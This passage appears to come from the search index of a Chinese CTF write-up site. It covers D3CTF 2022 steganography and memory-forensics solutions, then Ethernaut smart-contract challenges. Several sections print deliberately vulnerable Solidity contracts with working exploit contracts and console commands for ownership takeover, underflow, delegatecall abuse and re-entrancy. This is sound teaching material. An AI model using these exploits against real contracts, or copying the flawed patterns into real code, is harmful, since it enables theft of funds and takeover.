\u7684\u521d\u59cb\u6307\u9488\u53f3\u79fb\u4e00\u4f4d\uff08\u6216\u8005\u5728 bf \u4ee3\u7801\u5f00\u5934\u52a0\u4e00\u4e2a <code>&gt;</code>\uff09</p> <p>\u5f97\u5230\u5bc6\u7801\uff1a<code>0MTTW_CWZVN!</code></p> <p>\u7136\u540e\u7528 SilentEye \u89e3\u5bc6\u90a3\u5f20\u56fe\u7247\u5f97\u5230 flag\uff1a<code>D0g3{544f3225-bbaf-47dc-ba8d-5bda54cbaecb}</code></p>"}, {"location": "writeups/d3ctf2022/", "title": "D<sup>3</sup>CTF 2022 Writeup", "text": "<p> \u7ea6 452 \u4e2a\u5b57  143 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p> <p>Abstract</p> <p>D<sup>3</sup>\uff08Vidar\u3001L\u3001CNSS\uff09\u548c AntSRC \u4e3b\u529e\u7684\u6bd4\u8d5b\uff0cmisc \u9898\u76ee\u8f83\u5c11\uff0c\u4f46\u96be\u5ea6\u4e0d\u4f4e</p>"}, {"location": "writeups/d3ctf2022/#badw3ter", "title": "BadW3ter", "text": "<p>\u6587\u4ef6\u5934\uff1a</p> <p></p> <p>\u5c06 CUY1nw31lai \u6539\u4e3a RIFFWAVEfmt \u5c31\u53ef\u4ee5\u6b63\u5e38\u6253\u5f00\u64ad\u653e</p> <p>\u7531\u9898\u76ee\u4e2d deeper and deeper \u63a8\u6d4b\u4f7f\u7528 deepsound \u8fdb\u884c\u9690\u5199 \u4f7f\u7528 deepsound \u914d\u5408 CUY1nw31lai \u5bc6\u7801\u5f97\u5230</p> <p></p> <p>\u660e\u663e\u662f\u53e0\u52a0\u540e\u7684\u574f\u6389\u7684\u4e8c\u7ef4\u7801\uff0c\u76f4\u63a5\u626b\u63cf</p> <pre><code>Never gonna give you up\nNever gonna let you down\nNever gonna give you up\nNever gonna let you down\nNever gonna give you up\nNever gonna let you down\nNever gonna give you up\nNever gonna let you down\nNever gonna give you up\nNever gonna let you down\nNever gonna give you up\nNever gonna let you down\n</code></pre> <p>\u7531\u4e8e\u662f tiff \u6587\u4ef6\uff0c\u4f1a\u81ea\u5e26\u56fe\u5c42\uff0c\u5220\u6389\u767d\u8272\u80cc\u666f\u56fe\u5c42</p> <p>\u5957\u7528\u5e7b\u5f71\u5766\u514b\u4ee3\u7801\uff1a</p> <pre><code>import cv2\nimport numpy as np\nimport argparse\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description='\u63d0\u53d6\u5e7b\u5f71\u5766\u514b')\n    parser.add_argument('input', help='\u8f93\u5165\u56fe')\n    parser.add_argument('output1', help='\u8f93\u51fa\u9690\u85cf\u7684\u56fe')\n    parser.add_argument('output2', help='\u8f93\u51fa\u76f4\u63a5\u5c55\u793a\u7684\u56fe')\n    arg = parser.parse_args()\n\n    img_in = cv2.imread(arg.input, cv2.IMREAD_UNCHANGED)\n\n    if len(img_in.shape) &lt; 3 or img_in.shape[2] != 4:\n        parser.error('\u4f60\u7684\u56fe\u7247\u4e0d\u542balpha\u901a\u9053\uff01')\n\n    b = img_in[:, :, 0].astype(np.float)\n    g = img_in[:, :, 1].astype(np.float)\n    r = img_in[:, :, 2].astype(np.float)\n    a = img_in[:, :, 3].astype(np.float)\n\n    out1 = np.zeros([img_in.shape[0], img_in.shape[1], 3])\n    out2 = np.zeros([img_in.shape[0], img_in.shape[1], 3])\n\n    out1[:, :, 0] = b * a / 255\n    out1[:, :, 1] = g * a / 255\n    out1[:, :, 2] = r * a / 255\n    out2[:, :, 0] = 255 - (255 - b) * a / 255\n    out2[:, :, 1] = 255 - (255 - g) * a / 255\n    out2[:, :, 2] = 255 - (255 - r) * a / 255\n\n    out1 = np.clip(np.floor(out1), 0, 255).astype(np.uint8)\n    out2 = np.clip(np.floor(out2), 0, 255).astype(np.uint8)\n\n    cv2.imwrite(arg.output1, out1)\n    cv2.imwrite(arg.output2, out2)\n</code></pre> <p>\u5f97\u5230</p> <p></p> <p>\uff08\u6216\u8005\u76f4\u63a5\u5728 PS \u91cc\u6539\u80cc\u666f\uff09</p> <p>\u53ef\u4ee5\u626b\u63cf\u51fa flag\uff1aD3CTF{M1r@9e_T@nK_1s_Om0sh1roiii1111!!!!!Isn't_1t?}</p>"}, {"location": "writeups/d3ctf2022/#wannawacca", "title": "WannaWacca", "text": "<p>\u4f7f\u7528 Volatility \u5de5\u5177\u83b7\u53d6\u4e3b\u673a\u4fe1\u606f\uff0c\u901a\u8fc7 netscan \u547d\u4ee4\u83b7\u53d6\u6076\u610f\u8f6f\u4ef6\u8fdb\u7a0b\u53f7 1404</p> <pre><code>vol.py -f d3-win7-5f799647.vmem --profile=Win7SP0x64 netscan\nvol.py -f d3-win7-5f799647.vmem --profile=Win7SP0x64 dumpfiles -Q 0x000000003dec4a70 --dump-dir=./Smart.exe\n</code></pre> <p>\u5f97\u5230 SmartFalcon.exe</p> <p>\u8fdb\u884c upx \u8131\u58f3\uff0c\u4e4b\u540e\u518d\u4fee\u6539\u6076\u610f\u8f6f\u4ef6\u7684 ip (114.116.210.244) \u4fe1\u606f\u5230\u81ea\u5df1\u4e3b\u673a\uff0c\u901a\u8fc7\u7ed9\u7684 pcap \u6d41\u91cf\u91cd\u653e\u6d41\u91cf\u5bf9\u538b\u7f29\u7684 flag.zip \u8fdb\u884c\u89e3\u538b \u5bf9\u89e3\u5bc6\u540e\u7684 flag.zip \u7528 bkcrack \u901a\u8fc7 png \u6587\u4ef6\u5934\u8fdb\u884c\u5df2\u77e5\u660e\u6587\u653b\u51fb\uff0c\u5f97\u5230 key\uff1abd363f25 3a7da3aa 4bbe3175\uff0c\u89e3\u538b flag.zip \u5f97\u5230\u4e0b\u56fe\uff1a</p> <p></p> <p>\u660e\u663e\u7684\u5f69\u8272\u6a2a\u6761\u548c\u80cc\u666f\u82f9\u679c\u6697\u793a\uff0c\u5728\u82f9\u679c\u7684 png \u89e3\u6790\u4e2d\u4f1a\u5448\u73b0\u4e0d\u540c\u7684\u56fe\u50cf\uff1a</p> <p></p> <p>\u5206\u522b\u53d1\u73b0\u4e0a\u8fb9\u548c\u53f3\u4e0b\u89d2\u6709\u610f\u4e49\u4e0d\u660e\u7684\u767d\u8272\u50cf\u7d20\u70b9</p> <p></p> <p></p> <p>\u518d\u7531\u6587\u4ef6\u540d I can\u2019t see any light \u53ef\u4ee5\u63a8\u6d4b\u662f\u76f2\u6587\uff0c\u5e76\u4e14\u7279\u5f81\u660e\u663e\u53ef\u4ee5\u7ffb\u8bd1</p> <p>\u4e0a\u8fb9\u7684\u5f00\u5934\u5c31\u662f\u4e00\u4e2a\u6570\u5b57\u6807\u8bc6\uff0c\u5c1d\u8bd5\u8bfb\u53d6\u4e00\u70b9\u53d1\u73b0\u662f 504B0304\uff0czip \u6587\u4ef6\u5934\uff0c\u5168\u90e8\u8bfb\u53d6\uff1a</p> <pre><code>import numpy as np\nfrom PIL import Image\n\nimg = Image.open(\"braille.png\")\nwidth, height = size = img.size\narr = np.array(img)\n\nBLACK = np.array([0, 0, 0, 255])\nWHITE = np.array([255, 255, 255, 255])\n\nB00 = np.array([BLACK, BLACK])\nB01 = np.array([BLACK, WHITE])\nB10 = np.array([WHITE, BLACK])\nB11 = np.array([WHITE, WHITE])\n\nnum_flag = 0\n\ndef convert(code):\n    global num_flag\n    if (code == np.array([B01, B01, B11])).all():\n        num_flag = 1\n        return \"num\"\n    if (code == np.array([B10, B00, B00])).all():\n        if num_flag:\n            num_flag = 0\n            return \"1\"\n        else:\n            return \"a\"\n    if (code == np.array([B10, B10, B00])).all():\n        if num_flag:\n            num_flag = 0\n            return \"2\"\n        else:\n            return \"b\"\n    if (code == np.array([B11, B00, B00])).all():\n        if num_flag:\n            num_flag = 0\n            return \"3\"\n        else:\n            return \"c\"\n    if (code == np.array([B11, B01, B00])).all():\n        if num_flag:\n            num_flag = 0\n            return \"4\"\n        else:\n            return \"d\"\n    if (code == np.array([B10, B01, B00])).all():\n        if num_flag:\n            num_flag = 0\n            return \"5\"\n        else:\n            return \"e\"\n    if (code == np.array([B11, B10, B00])).all():\n        if num_flag:\n            num_flag = 0\n            return \"6\"\n        else:\n            return \"f\"\n    if (code == np.array([B11, B11, B00])).all():\n        if num_flag:\n            num_flag = 0\n            return \"7\"\n        else:\n            return \"g\"\n    if (code == np.array([B10, B11, B00])).all():\n        if num_flag:\n            num_flag = 0\n            return \"8\"\n        else:\n            return \"h\"\n    if (code == np.array([B01, B10, B00])).all():\n        if num_flag:\n            num_flag = 0\n            return \"9\"\n        else:\n            return \"i\"\n    if (code == np.array([B01, B11, B00])).all():\n        if num_flag:\n            num_flag = 0\n            return \"0\"\n        else:\n            return \"j\"\n\nfor i in range(4):\n    for j in range(960):\n        now = arr[i*3:i*3+3, j*2:j*2+2]\n        res = convert(now)\n        if res != \"num\" and res != None:\n            print(res, end=\"\")\n</code></pre> <p>\u7c98\u8d34\u5165 Hex Fiend\uff0c\u89e3\u538b\u5f97\u5230 Future will lead.txt \u6587\u4ef6\uff0c\u662f The Ray of Light \u6b4c\u8bcd\u6df7\u5165\u4e86\u4e00\u4e9b 0x7F \u5b57\u7b26</p> <p>\u82f9\u679c\u89e3\u91ca\u5668\u53f3\u4e0b\u89d2\u7684\u5185\u5bb9\u76f4\u63a5\u8bfb\u53d6\u65e0\u6cd5\u8bfb\u51fa\u6709\u6548\u5185\u5bb9\uff0c\u8003\u8651\u7ffb\u8f6c 180 \u5ea6\u4ece\u5de6\u5230\u53f3\u8bfb\u53d6\uff0c\u53d1\u73b0\u5927\u5199\u6807\u8bc6\uff0c\u5e76\u4e14\u53ef\u4ee5\u6b63\u5e38\u8bfb\u53d6</p> <p></p> <p>\u4eba\u5de5\u8bfb\u53d6\uff1a</p> <pre><code>VGV4dF9ibGluZF93YXRlcm1hcmsgcHdkIGlzOiBSQHkwZjEhOWh0\n</code></pre> <p>base64\u89e3\u7801\uff1a</p> <pre><code>Text_blind_watermark pwd is: R@y0f1!9ht\n</code></pre> <p> guofei9987/text_blind_watermark</p> <pre><code>from text_blind_watermark import extract\nprint(f\"d3ctf{{{extract(open('Future will lead.txt', 'r').read(), 'R@y0f1!9ht').strip()}}}\")\n</code></pre> <p>flag: d3ctf{b576241258a44b868ea25804b0ec1d4e}</p>"}, {"location": "writeups/ethernaut/", "title": "Ethernaut Writeups", "text": "<p> \u7ea6 3722 \u4e2a\u5b57  1152 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 27 \u5206\u949f</p> <p>Abstract</p> <p>https://ethernaut.openzeppelin.com/ \u4e0a\u7684\u4e00\u7cfb\u5217\u4ee5\u592a\u574a\u667a\u80fd\u5408\u7ea6\u7c7b\u9898\u76ee\uff0c\u5165\u95e8 blockchain \u7684\u65f6\u5019\u505a\u7684\uff0c\u8fd9\u91cc\u8bb0\u4e0b\u505a\u9898\u8bb0\u5f55</p> <p>\u524d\u7f6e\u6b65\u9aa4\uff1a</p> <ul> <li>\u5b89\u88c5 MetaMask \u6d4f\u89c8\u5668\u63d2\u4ef6\uff0c\u5e76\u521b\u5efa\u65b0\u8d26\u6237</li> <li>\u8fde\u63a5\u5230 Rinkeby \u6d4b\u8bd5\u7f51\u7edc</li> <li>\u901a\u8fc7 https://faucet.rinkeby.io/ \u6216\u8005 https://faucets.chain.link/rinkeby \u641e\u70b9\u6d4b\u8bd5\u5e01\uff08\u4e3b\u8981\u7528\u6765\u540e\u7eed\u652f\u4ed8 gas\uff09</li> <li>\u5728 ethernaut \u4e0a\u8fde\u63a5 MetaMask</li> <li>\u6bcf\u4e00\u9053\u9898\u76ee\u5148\u751f\u6210\u65b0\u5b9e\u4f8b\uff0c\u5728 console \u4e2d\u5b8c\u6210\u540e\u63d0\u4ea4\u5b9e\u4f8b</li> </ul>"}, {"location": "writeups/ethernaut/#hello-ethernaut", "title": "Hello Ethernaut", "text": "<p>\u6309\u7167\u9898\u76ee\u63d0\u793a\u4e00\u6b65\u4e00\u6b65\u8c03\u7528\u51fd\u6570\u5373\u53ef</p>"}, {"location": "writeups/ethernaut/#fallback", "title": "Fallback", "text": "<p>\u7ed9\u4e86\u5408\u7ea6\u6e90\u7801</p> \u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract Fallback {\n\n    using SafeMath for uint256;\n    mapping(address =&gt; uint) public contributions;\n    address payable public owner;\n\n    constructor() public {\n        owner = msg.sender;\n        contributions[msg.sender] = 1000 * (1 ether);\n    }\n\n    modifier onlyOwner {\n        require(\n            msg.sender == owner,\n            \"caller is not the owner\"\n        );\n        _;\n    }\n\n    function contribute() public payable {\n        require(msg.value &lt; 0.001 ether);\n        contributions[msg.sender] += msg.value;\n        if(contributions[msg.sender] &gt; contributions[owner]) {\n            owner = msg.sender;\n        }\n    }\n\n    function getContribution() public view returns (uint) {\n        return contributions[msg.sender];\n    }\n\n    function withdraw() public onlyOwner {\n        owner.transfer(address(this).balance);\n    }\n\n    receive() external payable {\n        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);\n        owner = msg.sender;\n    }\n}\n</code></pre> <p>\u76ee\u6807\u662f\u62ff\u5230\u8fd9\u4e2a\u5408\u7ea6\u7684\u63a7\u5236\u6743\uff0c\u8f6c\u51fa\u6240\u6709\u4f59\u989d</p> <p>\u4e3b\u8981\u903b\u8f91\u662f contribute \u51fd\u6570\u4f1a\u589e\u52a0\u8c03\u7528\u8005\u7684 contributions\uff0c\u5f53\u5927\u4e8e 1000 ether \u7684\u65f6\u5019\uff0c\u4f1a\u628a\u6240\u6709\u6743\u8f6c\u7ed9\u73a9\u5bb6\u3002\u901a\u8fc7\u8fd9\u4e2a\u6765\u83b7\u5f97\u63a7\u5236\u6743\u662f\u4e0d\u73b0\u5b9e\u7684</p> <p>\u800c\u53e6\u4e00\u4e2a\u4f1a\u53d1\u751f\u6240\u6709\u6743\u8f6c\u6362\u7684\u51fd\u6570\u662f receive \u51fd\u6570\uff0c\u8fd9\u662f\u4e00\u4e2a fallback \u51fd\u6570\uff0c\u4f1a\u5728\u5408\u7ea6\u8d26\u6237\u63a5\u6536\u4ee5\u592a\u5e01\u7684\u65f6\u5019\u89e6\u53d1\uff0c\u6240\u4ee5\u5728\u8fd9\u91cc\u53ea\u8981\u5411\u5408\u7ea6\u53d1\u51fa\u5e26\u6709\u4ee5\u592a\u5e01\u7684\u4ea4\u6613\u5c31\u53ef\u4ee5\u89e6\u53d1\u8fd9\u4e2a\u51fd\u6570\u8f6c\u79fb\u6240\u6709\u6743</p> <p>\u800c\u4e4b\u524d\u8fd8\u9700\u8981\u5148\u4fdd\u8bc1 contributions \u5927\u4e8e 0\uff0c\u6240\u4ee5\u89e3\u6cd5\uff1a <pre><code>&gt; contract.contribute({value: 1})      // \u4f7f contributions \u5927\u4e8e 0 \n&gt; contract.sendTransaction({value: 1}) // \u89e6\u53d1 fallback \u8f6c\u79fb\u6240\u6709\u6743\n&gt; contract.withdraw()                  // \u8f6c\u51fa\u6240\u6709\u4f59\u989d\n</code></pre></p>"}, {"location": "writeups/ethernaut/#fallout", "title": "Fallout", "text": "<p>\u8981\u6c42\u5f97\u5230\u5408\u7ea6\u7684\u6240\u6709\u6743</p> <p>\u6839\u636e\u5408\u7ea6\u6e90\u7801\u53ef\u4ee5\u53d1\u73b0\u5b83\u7684 constructor \u7684\u51fd\u6570\u540d\u4e3a Fal1out\uff0c\u5e76\u4e0d\u662f\u5408\u7ea6\u540d Fallout\uff0c\u6709 l1 \u7684\u5dee\u522b</p> <p>\u6240\u4ee5\u76f4\u63a5\u8c03\u7528 contract.Fal1out() \u5c31\u53ef\u4ee5\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u62ff\u5230\u5408\u7ea6\u6240\u6709\u6743</p>"}, {"location": "writeups/ethernaut/#coin-flip", "title": "Coin Flip", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>pragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract CoinFlip {\n\n    using SafeMath for uint256;\n    uint256 public consecutiveWins;\n    uint256 lastHash;\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n    constructor() public {\n        consecutiveWins = 0;\n    }\n\n    function flip(bool _guess) public returns (bool) {\n        uint256 blockValue = uint256(blockhash(block.number.sub(1)));\n\n        if (lastHash == blockValue) {\n            revert();\n        }\n\n        lastHash = blockValue;\n        uint256 coinFlip = blockValue.div(FACTOR);\n        bool side = coinFlip == 1 ? true : false;\n\n        if (side == _guess) {\n            consecutiveWins++;\n            return true;\n        } else {\n            consecutiveWins = 0;\n            return false;\n        }\n    }\n}\n</code></pre> <p>\u8981\u6c42\u8fde\u7eed\u731c\u5bf9\u5341\u6b21\uff0c\u5408\u7ea6\u4e2d\u7ed9\u51fa\u4e86\u5b83\u53d6\u968f\u673a\u6570\u7684\u65b9\u5f0f\uff0c\u5373\u5c06 block.number \u51cf\u4e00\uff0c\u53d6\u54c8\u5e0c\u503c\uff0c\u7136\u540e\u518d\u9664\u4ee5 FACTOR \u5224\u65ad\u662f\u5426\u4e3a 1</p> <p>\u6240\u4ee5\u5199\u4e00\u4e2a\u65b0\u5408\u7ea6\u6765\u83b7\u53d6\u540c\u6837\u7684 block.number \u5c31\u53ef\u4ee5\u8ba1\u7b97\u51fa\u7b54\u6848</p> <p>\u56e0\u4e3a\u5224\u65ad\u4e86 lashHash == blockValue \u7684\u65f6\u5019 revert\uff0c\u6240\u4ee5\u9700\u8981\u7b49\u4e00\u6bb5\u65f6\u95f4\uff0c\u9010\u6b21\u731c\u6d4b\uff0c\u8fde\u7eed\u731c 10 \u6b21 </p> exp <pre><code>// SPDX-License-Identifier: GPL-3.0\npragma solidity ^0.6.0;\n\n/* code of CoinFlip */\n\ncontract Exploit {\n    using SafeMath for uint256;\n    CoinFlip p;\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n    constructor(address challenge) public {\n        p = CoinFlip(challenge);\n    }\n    function exp() public {\n        uint256 blockValue = uint256(blockhash(block.number.sub(1)));\n        uint256 coinFlip = blockValue.div(FACTOR);\n        bool side = coinFlip == 1 ? true : false;\n        p.flip(side);\n    }\n}\n</code></pre>"}, {"location": "writeups/ethernaut/#telephone", "title": "Telephone", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract Telephone {\n    address public owner;\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    function changeOwner(address _owner) public {\n        if (tx.origin != msg.sender) {\n            owner = _owner;\n        }\n    }\n}\n</code></pre> <p>\u4e5f\u662f\u9700\u8981\u62ff\u5230\u5408\u7ea6\u7684\u6240\u6709\u6743\uff0c\u800c\u8c03\u7528\u5408\u7ea6\u4e2d\u7684 changeOwner \u51fd\u6570\u6765\u8f6c\u79fb\u6240\u6709\u6743\u7684\u8bdd\uff0c\u9700\u8981\u4f7f tx.origin \u548c msg.sender \u4e0d\u540c</p> <p>\u5b83\u4eec\u7684\u533a\u522b\uff1a</p> <ul> <li>tx.origin\uff1a\u4ea4\u6613\u53d1\u9001\u65b9\uff0c\u662f\u6574\u4e2a\u4ea4\u6613\u6700\u5f00\u59cb\u7684\u5730\u5740</li> <li>msg.sender\uff1a\u6d88\u606f\u53d1\u9001\u65b9\uff0c\u662f\u5f53\u524d\u8c03\u7528\u7684\u8c03\u7528\u65b9\u5730\u5740</li> </ul> <p>\u6240\u4ee5\u5982\u679c\u901a\u8fc7 \u8d26\u6237 A -&gt; \u5408\u7ea6 A -&gt; \u5408\u7ea6 B \u6765\u8c03\u7528\u7684\u8bdd\uff0ctx.origin \u5c31\u662f\u8d26\u6237 A\uff0c\u800c\u5bf9\u4e8e\u5408\u7ea6 B \u6765\u8bf4\uff0cmsg.sender \u662f\u5408\u7ea6 A</p> <p>\u6240\u4ee5\u8fd9\u9898\u53ea\u9700\u8981\u7f16\u5199\u4e00\u4e2a\u65b0\u7684\u5408\u7ea6\u6765\u8c03\u7528\u9898\u76ee\u7684 changeOwner \u51fd\u6570\u5c31\u597d\u4e86</p> exp <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\n/* code of Telephone */\n\ncontract Exploit {\n    Telephone p = Telephone(&lt;instance address&gt;);\n    function exp() public {\n        p.changeOwner(msg.sender);\n    }\n}\n</code></pre>"}, {"location": "writeups/ethernaut/#token", "title": "Token", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract Token {\n    mapping(address =&gt; uint) balances;\n    uint public totalSupply;\n\n    constructor(uint _initialSupply) public {\n        balances[msg.sender] = totalSupply = _initialSupply;\n    }\n\n    function transfer(address _to, uint _value) public returns (bool) {\n        require(balances[msg.sender] - _value &gt;= 0);\n        balances[msg.sender] -= _value;\n        balances[_to] += _value;\n        return true;\n    }\n\n    function balanceOf(address _owner) public view returns (uint balance) {\n        return balances[_owner];\n    }\n}\n</code></pre> <p>\u5f00\u5c40\u81ea\u5df1\u7684 balance \u662f 20\uff0c\u76ee\u7684\u662f\u589e\u52a0\u81ea\u5df1\u7684 balance</p> <p>\u53ef\u4ee5\u53d1\u73b0 transfer \u4e2d\u662f\u76f4\u63a5\u5c06 sender \u7684 balance \u51cf\u8f6c\u8d26\u7684 value\uff0c\u800c\u5982\u679c value \u8d85\u8fc7 balance \u5219\u4f1a\u53d1\u751f\u6ea2\u51fa\uff0c\u56e0\u4e3a\u662f uint\uff0c\u5219\u4f1a\u53d8\u4e3a\u5f88\u5927\u7684\u503c</p> <p>\u6240\u4ee5\u901a\u8fc7 <code>await contract.transfer(&lt;any address&gt;, 21)</code> \u5373\u53ef\u4f7f\u81ea\u5df1\u7684 balance \u6ea2\u51fa\u53d8\u5927</p>"}, {"location": "writeups/ethernaut/#delegation", "title": "Delegation", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract Delegate {\n    address public owner;\n    constructor(address _owner) public {\n        owner = _owner;\n    }\n    function pwn() public {\n        owner = msg.sender;\n    }\n}\n\ncontract Delegation {\n    address public owner;\n    Delegate delegate;\n    constructor(address _delegateAddress) public {\n        delegate = Delegate(_delegateAddress);\n        owner = msg.sender;\n    }\n    fallback() external {\n        (bool result,) = address(delegate).delegatecall(msg.data);\n        if (result) {\n            this;\n        }\n    }\n}\n</code></pre> <p>\u76ee\u7684\u8fd8\u662f\u62ff\u5230\u6240\u6709\u6743\uff0c\u5373\u6267\u884c Delegate \u4e2d\u7684 pwn \u51fd\u6570</p> <p>\u53ef\u4ee5\u901a\u8fc7\u89e6\u53d1 fallback \u51fd\u6570\uff0c\u7136\u540e\u8c03\u7528 delegatecall \u6765\u901a\u8fc7 msg.data \u8c03\u7528 pwn \u51fd\u6570</p> <p>data \u4e2d\u524d\u56db\u4e2a\u5b57\u8282\u662f\u8981\u8c03\u7528\u7684\u51fd\u6570\u524d\u9762\u7684 sha3 \u503c\u7684\u524d\u56db\u4e2a\u5b57\u8282\uff0c\u540e\u9762\u5982\u679c\u6ca1\u6709\u4f20\u5165\u6570\u636e\u53ef\u4ee5\u7701\u7565</p> <p>\u6240\u4ee5\u8ba1\u7b97\u51fa pwn() \u7684 sha3 \u7136\u540e\u4f5c\u4e3a data \u4f20\u7ed9 fallback \u5373\u53ef</p> <pre><code>&gt; web3.utils.sha3(\"pwn()\")\n'0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab'\n&gt; contract.sendTransaction({data: \"0xdd365b8b\"})\n</code></pre>"}, {"location": "writeups/ethernaut/#force", "title": "Force", "text": "<p>\u9898\u76ee\u662f\u4e00\u4e2a\u7a7a\u7684\u5408\u7ea6\uff0c\u8981\u6c42\u5411\u5176\u4e2d\u8f6c\u8d26</p> <p>\u800c\u4e00\u4e2a\u5408\u7ea6\u5728\u81ea\u6bc1\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u5c06\u4f59\u989d\u5168\u90e8\u5f3a\u5236\u8f6c\u5230\u53e6\u4e00\u4e2a\u5730\u5740\u4e0a\uff0c\u6240\u4ee5\u65b0\u5efa\u4e00\u4e2a\u5408\u7ea6\u7136\u540e\u81ea\u6bc1\uff0c\u628a\u4f59\u989d\u8f6c\u5230\u5b9e\u4f8b\u5730\u5740\u4e0a\u5c31\u53ef\u4ee5\u4e86</p> <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract Exploit {\n    constructor() public payable {}  // \u521d\u59cb\u8981\u63a5\u6536 value \u6765\u521b\u5efa\u5408\u7ea6\n    function exp(address challenge) public {\n        // \u9700\u8981\u5148\u5f3a\u5236\u8f6c\u6362\u4e3a payable\n        address payable challenge = payable(address(challenge));\n        selfdestruct(challenge);\n    }\n}\n</code></pre>"}, {"location": "writeups/ethernaut/#vault", "title": "Vault", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract Vault {\n    bool public locked;\n    bytes32 private password;\n\n    constructor(bytes32 _password) public {\n        locked = true;\n        password = _password;\n    }\n\n    function unlock(bytes32 _password) public {\n        if (password == _password) {\n            locked = false;\n        }\n    }\n}\n</code></pre> <p>\u8981 unlock \u8fd9\u4e2a\u5408\u7ea6\u8d26\u6237\uff0c\u4e5f\u5c31\u662f\u8981\u627e\u5230 password</p> <p>\u867d\u7136 password \u88ab\u8bbe\u4e3a\u4e86 private\uff0c\u4f46\u662f\u5728\u533a\u5757\u4e2d\u7684\u6570\u636e\u4ecd\u7136\u662f\u53ef\u89c1\u7684\uff0c\u6240\u4ee5\u53ea\u8981 getStorageAt \u5c31\u53ef\u4ee5\u4e86\uff1a <pre><code>&gt; await web3.eth.getStorageAt(instance, 1) // 0 \u4e3a locked \u7684\u4f4d\u7f6e\uff0c1 \u4e3a password\n'0x412076657279207374726f6e67207365637265742070617373776f7264203a29'\n&gt; web3.utils.toAscii(\"0x412076657279207374726f6e67207365637265742070617373776f7264203a29\")\n'A very strong secret password :)'\n&gt; await contract.unlock(\"0x412076657279207374726f6e67207365637265742070617373776f7264203a29\")\n// \u53c2\u6570\u662f bytes32\uff0c\u6240\u4ee5\u4e0d\u80fd\u76f4\u63a5\u4f20\u5b57\u7b26\u4e32\u8fdb\u53bb\n</code></pre></p>"}, {"location": "writeups/ethernaut/#king", "title": "King", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract King {\n    address payable king;\n    uint public prize;\n    address payable public owner;\n\n    constructor() public payable {\n        owner = msg.sender;  \n        king = msg.sender;\n        prize = msg.value;\n    }\n\n    receive() external payable {\n        require(msg.value &gt;= prize || msg.sender == owner);\n        king.transfer(msg.value);\n        king = msg.sender;\n        prize = msg.value;\n    }\n\n    function _king() public view returns (address payable) {\n        return king;\n    }\n}\n</code></pre> <p>\u5f53\u9898\u76ee\u518d\u6b21\u51fa\u8d44\u66f4\u9ad8\u7684\u65f6\u5019\uff0cking \u5c31\u4f1a\u56de\u5230\u9898\u76ee\u4e0a\uff0c\u8981\u4fdd\u6301 king \u5728\u81ea\u5df1\u8eab\u4e0a</p> <p>\u800c\u6bcf\u6b21\u66f4\u6362 king \u7684\u65f6\u5019\u90fd\u4f1a\u5148\u628a\u91d1\u989d transfer \u7ed9\u4e0a\u4e00\u4e2a king\uff0c\u6240\u4ee5\u53ea\u8981\u4e0d\u63a5\u6536\u5c31\u597d\u4e86</p> <p>\u53ef\u4ee5\u4f7f\u7528 fallback\uff0c\u7136\u540e\u51fd\u6570\u91cc\u9762\u76f4\u63a5 revert</p> <p><pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract Exploit {\n    constructor(address challenge) public payable {\n        challenge.call.gas(10000000).value(msg.value)(\"\");\n    }\n    fallback() external {\n        revert();\n    }\n}\n</code></pre> \u6ce8\u610f\u9700\u8981\u652f\u4ed8\u5927\u4e8e 1 ether \u624d\u53ef\u4ee5\u5148\u62ff\u5230 king </p>"}, {"location": "writeups/ethernaut/#re-entrancy", "title": "Re-entrancy", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract Reentrance {\n\n    using SafeMath for uint256;\n    mapping(address =&gt; uint) public balances;\n\n    function donate(address _to) public payable {\n        balances[_to] = balances[_to].add(msg.value);\n    }\n\n    function balanceOf(address _who) public view returns (uint balance) {\n        return balances[_who];\n    }\n\n    function withdraw(uint _amount) public {\n        if(balances[msg.sender] &gt;= _amount) {\n            (bool result,) = msg.sender.call{value:_amount}(\"\");\n            if(result) {\n                _amount;\n            }\n            balances[msg.sender] -= _amount;\n        }\n    }\n\n    receive() external payable {}\n}\n</code></pre> <p>\u91cd\u5165\u653b\u51fb\uff0c\u56e0\u4e3a\u4f7f\u7528\u7684\u662f <code>msg.sender.call{value:_amount}(\"\")</code>\uff0c\u5e76\u4e14\u5728\u8fd9\u4e4b\u540e\u624d\u51cf\u5c11 balances</p> <p>\u800c\u8fd9\u4e2a call \u4f1a\u6389\u5230 fallback \u4e2d\uff0c\u5982\u679c fallback \u91cc\u518d\u6b21\u8c03\u7528\u4e86 withdraw 